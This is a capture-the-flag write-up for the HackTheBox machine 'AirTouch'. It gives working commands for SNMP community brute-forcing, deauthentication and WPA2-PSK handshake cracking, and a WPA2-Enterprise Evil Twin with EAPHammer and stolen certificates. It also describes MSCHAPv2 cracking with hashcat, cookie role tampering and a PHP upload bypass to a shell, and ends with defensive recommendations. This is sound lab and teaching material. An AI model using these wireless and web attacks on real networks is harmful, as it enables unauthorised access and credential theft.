---
title: "AirTouch"
machine: "AirTouch"
status: retired
os: Linux
difficulty: Medium
ownedUser: true
ownedRoot: true
date: 2026-02-24
techniques:
  - "UDP recon"
  - "SNMP enum"
  - "WPA2-PSK crack"
  - "Wireshark WPA2 decrypt"
  - "Cookie role abuse"
  - "PHP upload bypass"
  - "WPA2-Enterprise Evil Twin"
  - "EAPHammer"
  - "PEAP-MSCHAPv2 crack"
cves: []
summary: "A rare HTB machine that models a real corporate wireless environment — three isolated VLANs, WPA2-PSK, and a WPA2-Enterprise Evil Twin using stolen server certificates against EAPHammer."
proof: "/proof/airtouch.png"
draft: false
---

## Summary

AirTouch is the closest thing HTB has to a real corporate wireless
engagement. Instead of web exploits, you get **three isolated VLANs**
representing a consultant zone, a tablet zone, and a corporate zone —
and the only way through each barrier is a different wireless attack.
UDP-only recon leads to SNMP; SNMP leads to an SSH foothold; and from
that foothold you drive seven virtual `wlan*` interfaces to capture a
WPA2-PSK handshake, then move on to a full WPA2-Enterprise Evil Twin
using stolen server certificates.

## Reconnaissance

The trap on AirTouch is skipping UDP.

```bash
sudo nmap -sU --top-ports 1000 10.129.X.X
```

Only **`161/udp` (SNMP)** is interesting. TCP shows just SSH — which is
misleading enough that most people bounce off the box before ever
running the UDP scan.

### SNMP Community Brute Force

```bash
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 10.129.X.X
```

`public` works. Walking the SNMP tree reveals a password stored inside
`sysDescr` — a real-world misconfiguration that shows up in embedded
network equipment more often than the industry likes to admit.

## Initial Foothold — Consultant VLAN

SSH in with the leaked SNMP password.

```bash
ssh -o PreferredAuthentications=password consultant@10.129.X.X
```

Inside the consultant's home directory:

- Seven virtual wireless interfaces (`wlan0`–`wlan6`) simulating a
  corporate wireless plant
- A network topology diagram describing three VLANs
- `sudo -l` returns `(ALL) NOPASSWD: ALL` — **not** a privesc gift;
  the machine gives you root because you need it to put wireless
  interfaces into monitor mode

The three zones:

| VLAN | Range          | Protection             |
|------|----------------|------------------------|
| A    | 172.20.1.0/24  | Consultant (current)   |
| B    | 192.168.3.0/24 | WPA2-PSK               |
| C    | 10.10.10.0/24  | WPA2-Enterprise (PEAP) |

## Phase B — Tablet VLAN via WPA2-PSK

Put an interface into monitor mode:

```bash
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
```

Find the target SSID and channel:

```bash
iw dev wlan0 scan | grep -E 'SSID|BSS|signal|freq'
```

Capture the handshake for `AirTouch-Internet`:

```bash
airodump-ng --bssid <AP-BSSID> -c 6 -w /tmp/tablet_cap wlan0
```

Force a re-handshake by deauthenticating the connected client:

```bash
aireplay-ng -0 10 -a <AP-BSSID> -c <client-BSSID> wlan0
```

Crack offline:

```bash
aircrack-ng /tmp/tablet_cap*.cap -w /usr/share/wordlists/rockyou.txt
```

Bring up a client on the newly-cracked SSID:

```bash
wpa_passphrase AirTouch-Internet '<PSK>' > /tmp/wpa_tablet.conf
wpa_supplicant -B -i wlan3 -c /tmp/wpa_tablet.conf
dhclient wlan3
```

You are now in VLAN B.

## Gateway Compromise

Wireshark decrypts the captured `.cap` file with the cracked PSK. Inside
the decrypted HTTP traffic is a login POST containing valid credentials
for the router management panel — and a session cookie in which the
user's role is trusted client-side.

> **Danger — never trust client-side role state.** `UserRole=user` in a
> cookie is an invitation. Any authorization decision made against a
> value that came out of the client belongs in the same category as
> `admin=true` in a query string.

Changing that role to `admin` unlocks a hidden upload panel. A blacklist
of banned extensions accepts `.phtml`, which many Apache configurations
still map to the PHP handler. From there the reverse shell must connect
back to your address inside VLAN B — the gateway cannot route to
VLAN A. Post-exploitation on the gateway surfaces a second set of
credentials and, more importantly, **the WPA2-Enterprise server
certificate bundle** (`ca.crt`, `server.crt`, `server.key`) from a
`send_certs.sh` helper script.

## Phase C — Corporate VLAN via WPA2-Enterprise Evil Twin

With stolen certificates, run EAPHammer as an Evil Twin cloning
`AirTouch-Office`:

```bash
python3 eaphammer -i wlan2 -e AirTouch-Office -c 44 --hw-mode a \
  --auth wpa-eap --creds --negotiate balanced \
  --server-cert certs/server.crt \
  --ca-cert certs/ca.crt \
  --private-key certs/server.key
```

Kick clients off the real AP with a targeted deauth on the same channel:

```bash
ip link set wlan5 down && iw dev wlan5 set type monitor && ip link set wlan5 up
iw dev wlan5 set channel 44
aireplay-ng -0 10 -a <real-AP-BSSID> wlan5
```

When a client roams to the Evil Twin, EAPHammer captures the MSCHAPv2
challenge/response. Crack it with hashcat mode 5500:

```bash
hashcat -m 5500 /tmp/hash.txt /usr/share/wordlists/rockyou.txt --force
```

Configure `wpa_supplicant` with the domain-prefixed identity —
`AirTouch\<user>` — exactly as EAPHammer captured it, and connect to
VLAN C.

## Root — Management Host

The `send_certs.sh` script from the gateway also leaks credentials for
a `remote@10.10.10.1` SSH account. From there, standard enumeration
turns up an `admin` user in `/etc/passwd` — and the hostapd EAP user
database still contains the admin password in plaintext:

```bash
cat /etc/hostapd/hostapd_wpe.eap_user | grep admin
```

`su admin` then `sudo su` gives root. Read the root proof.

## Attack Chain Summary

1. UDP scan → SNMP with `public` community
2. SNMP walk → password in `sysDescr`
3. SSH to Consultant VLAN → 7 virtual `wlan*` interfaces
4. Monitor mode → 4-way handshake capture on `AirTouch-Internet`
5. `aircrack-ng` → WPA2-PSK cracked
6. Wireshark decrypt → gateway creds + session cookie
7. Cookie `UserRole=admin` → PHP file upload → shell
8. Gateway loot → `send_certs.sh` with WPA2-Ent certs
9. EAPHammer Evil Twin → PEAP-MSCHAPv2 capture
10. `hashcat -m 5500` → domain identity + password
11. `wpa_supplicant` → VLAN C
12. SSH → management host → `hostapd_wpe.eap_user` leaks admin
13. `su admin` → `sudo su` → root

## Takeaways

- **Wireless is a first-class attack surface.** Most engagements skip
  it entirely and treat "you'd need to be on the LAN" as a mitigation.
  That is exactly the assumption AirTouch punishes.
- **Certificates are credentials.** A stolen RADIUS server certificate
  turns a hardened WPA2-Enterprise network into WPA2-PSK's equally
  breakable cousin.
- **Every configuration file is a credential store you haven't audited
  yet.** `send_certs.sh`, `hostapd_wpe.eap_user`, PHP login stubs —
  each leaked exactly the credential needed for the next hop.

## Defensive Perspective

- **SNMP:** disable v1/v2c on any device that supports v3. Rotate away
  from `public`. Never store credentials in `sysDescr`, `sysLocation`,
  or `sysContact` fields.
- **WPA2-PSK:** enforce a minimum 20-character random passphrase;
  short passphrases are recoverable overnight on commodity GPUs.
- **WPA2-Enterprise:** migrate from PEAP-MSCHAPv2 to **EAP-TLS**.
  Client-certificate authentication eliminates the credential-capture
  attack entirely. If PEAP is required, enforce strict CA pinning on
  every supplicant.
- **Access-point trust:** deploy WIPS that flag rogue BSSIDs
  advertising your enterprise SSID.
- **Client-side role state:** never store role/permission in a cookie
  the client can read or edit. All authorization must be a server-side
  decision keyed off a signed session identifier.

## References

- [MITRE ATT&CK T1557 — Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557/)
- [Aircrack-ng suite](https://www.aircrack-ng.org/doku.php)
- [EAPHammer](https://github.com/s0lst1c3/eaphammer)
- [hashcat wiki — mode 5500 NETNTLMv1](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [SNMP best practices — RFC 3411](https://www.rfc-editor.org/rfc/rfc3411)
